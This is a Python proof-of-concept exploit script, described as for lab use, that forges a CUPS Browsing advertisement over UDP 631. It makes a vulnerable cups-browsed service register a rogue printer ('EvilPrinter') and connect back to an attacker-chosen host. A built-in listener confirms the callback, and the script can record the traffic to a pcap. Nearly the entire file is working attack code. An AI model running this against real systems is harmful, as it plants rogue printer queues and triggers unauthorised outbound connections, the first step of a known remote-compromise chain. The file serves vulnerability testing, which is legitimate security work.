"""
Forged CUPS Browsing advertisement sender.

Sends a crafted browse packet to UDP 631. A vulnerable cups-browsed trusts it,
creates a local queue, and connects back to the advertised URI to read printer
attributes. That callback is the proof. 

Lab use only. Needs root.
"""

import argparse
import logging
import socket
import sys
import threading
import time

from scapy.all import IP, UDP, Raw, AsyncSniffer, send, wrpcap

log = logging.getLogger("cups_attack")


def build_payload(args):
    """Browse message: 'type state uri ["loc" "info" "model"]'. uri is the callback target."""
    uri = f"{args.printer_scheme}://{args.printer_host}:{args.printer_port}/printers/{args.printer_name}"
    if args.minimal:
        text = f"{args.ptype} {args.state} {uri}"
    else:
        text = f'{args.ptype} {args.state} {uri} "{args.location}" "{args.info}" "{args.make_model}"'
    log.debug("callback uri: %s", uri)
    log.debug("payload: %s", text)
    return text.encode("utf-8", errors="replace")


def build_packet(args, payload):
    return IP(dst=args.target) / UDP(sport=args.sport, dport=args.target_port) / Raw(load=payload)


class CallbackListener(threading.Thread):
    """TCP server on the advertised port. A connection from the victim means the
    discovery worked. The port must be free, so don't run this and ippeveprinter
    on the same port at once."""

    def __init__(self, port, timeout):
        super().__init__(daemon=True)
        self.port = port
        self.timeout = timeout
        self.hits = []
        self._stop = threading.Event()
        self._sock = None

    def run(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self.port))
            self._sock.listen(5)
            self._sock.settimeout(1.0)
            log.info("listener up on 0.0.0.0:%d (%ds window)", self.port, self.timeout)
        except Exception as exc:
            log.error("listener failed on port %d: %s", self.port, exc)
            return

        deadline = time.time() + self.timeout
        while not self._stop.is_set() and time.time() < deadline:
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with conn:
                conn.settimeout(2.0)
                try:
                    data = conn.recv(4096)
                except Exception:
                    data = b""
                self.hits.append((addr, len(data)))
                log.warning("callback from %s:%d (%d bytes) - discovery confirmed",
                            addr[0], addr[1], len(data))
                try:
                    conn.sendall(b"HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\n\r\n")
                except Exception:
                    pass
        self._close()

    def _close(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    def stop(self):
        self._stop.set()
        self._close()


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        prog="cups_attack.py",
        description="Send a forged CUPS browse advertisement to a vulnerable cups-browsed.",
    )

    p.add_argument("--target", required=True, help="victim IP (cups-browsed), e.g. 172.18.0.2")
    p.add_argument("--target-port", type=int, default=631, help="victim UDP port (default 631)")

    p.add_argument("--printer-host", required=True, help="address the victim calls back to")
    p.add_argument("--printer-port", type=int, default=8632, help="callback port (default 8632)")
    p.add_argument("--printer-name", default="EvilPrinter", help="name used in /printers/<name>")
    p.add_argument("--printer-scheme", default="ipp", choices=["ipp", "ipps", "http", "https"])

    p.add_argument("--ptype", default="0", help="printer-type field")
    p.add_argument("--state", type=int, default=3, choices=[3, 4, 5], help="3 idle, 4 processing, 5 stopped")
    p.add_argument("--location", default="LabRoom")
    p.add_argument("--info", default="Discovery PoC Printer")
    p.add_argument("--make-model", default="Evil Printer 1.0")
    p.add_argument("--minimal", action="store_true", help="send only 'type state uri'")

    p.add_argument("--sport", type=int, default=631, help="UDP source port")
    p.add_argument("--count", type=int, default=1, help="number of advertisements")
    p.add_argument("--interval", type=float, default=1.0, help="delay between advertisements")
    p.add_argument("--iface", default=None, help="interface for send/sniff (e.g. a docker bridge)")

    p.add_argument("--listen", action="store_true", help="run built-in callback listener")
    p.add_argument("--listen-time", type=int, default=15, help="callback window in seconds")
    p.add_argument("--pcap", default=None, help="write captured traffic to this file")
    p.add_argument("--log-file", default=None, help="also write logs here")
    p.add_argument("-v", "--verbose", action="store_true")

    return p.parse_args(argv)


def setup_logging(verbose, log_file):
    handlers = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
        handlers=handlers,
    )


def main(argv=None):
    args = parse_args(argv)
    setup_logging(args.verbose, args.log_file)

    log.info("target %s:%d/udp", args.target, args.target_port)
    log.info("advertising %s://%s:%d/printers/%s",
             args.printer_scheme, args.printer_host, args.printer_port, args.printer_name)

    listener = None
    if args.listen:
        listener = CallbackListener(args.printer_port, args.listen_time)
        listener.start()
        time.sleep(0.3)

    sniffer = None
    if args.pcap:
        bpf = f"host {args.target} or host {args.printer_host} or port {args.printer_port}"
        sniffer = AsyncSniffer(iface=args.iface, filter=bpf)
        sniffer.start()
        time.sleep(0.3)
        log.info("sniffing (%s)", bpf)

    payload = build_payload(args)
    pkt = build_packet(args, payload)

    log.info("sending %d advertisement(s)", args.count)
    for i in range(1, args.count + 1):
        send(pkt, iface=args.iface, verbose=False)
        log.info("  [%d/%d] sent, %d bytes", i, args.count, len(payload))
        if i < args.count:
            time.sleep(args.interval)

    if listener:
        log.info("waiting up to %ds for callback", args.listen_time)
        listener.join(timeout=args.listen_time + 1)
        listener.stop()
        if listener.hits:
            log.warning("victim called back %d time(s)", len(listener.hits))
        else:
            log.info("no callback (check host/port, route, container state)")
    else:
        log.info("no listener: look in printer.log or the pcap for the callback")

    if sniffer:
        time.sleep(0.5)
        results = sniffer.stop()
        if results:
            wrpcap(args.pcap, results)
            log.info("wrote %d packets to %s", len(results), args.pcap)
        else:
            log.info("nothing captured")

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        sys.exit(130)
